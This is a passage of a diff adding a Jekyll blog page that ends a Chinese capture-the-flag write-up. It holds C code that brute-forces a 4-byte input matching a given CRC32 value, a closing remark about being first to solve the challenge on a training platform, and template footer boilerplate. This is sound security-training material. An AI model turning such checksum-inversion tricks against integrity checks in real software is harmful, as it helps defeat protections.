+  <span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
+
+  <span class="n">p</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
+  <span class="n">crc</span> <span class="o">=</span> <span class="n">crc</span> <span class="o">^</span> <span class="o">~</span><span class="mi">0U</span><span class="p">;</span>
+
+  <span class="k">while</span> <span class="p">(</span><span class="n">size</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">crc</span> <span class="o">=</span> <span class="n">crc32_tab</span><span class="p">[(</span><span class="n">crc</span> <span class="o">^</span> <span class="o">*</span><span class="n">p</span><span class="o">++</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">crc</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="k">return</span> <span class="n">crc</span> <span class="o">^</span> <span class="o">~</span><span class="mi">0U</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">uint32_t</span> <span class="n">crcval</span><span class="p">;</span>
+    <span class="n">scanf</span><span class="p">(</span><span class="s">"%u"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">crcval</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">x</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="mh">0xffffffff</span><span class="p">;</span> <span class="n">x</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">crc32</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">x</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">))</span> <span class="o">==</span> <span class="n">crcval</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"%x"</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2 id="0x08">0x08 后言</h2>
+
+<p>哈哈，我其实是在这个训练平台上第一个做出来这道题的，可以。最后，再次祝大家苟年大吉，万事如意，新的一年挖到更多0day！<br>
+ <img src="/images/742286_CKCAC3V69KJFXPC.png" alt="图片描述"></p>
+
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>Your awesome title</li>
+          <li><a href="mailto:your-email@domain.com">your-email@domain.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/jekyll"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">jekyll</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/jekyllrb"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">jekyllrb</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
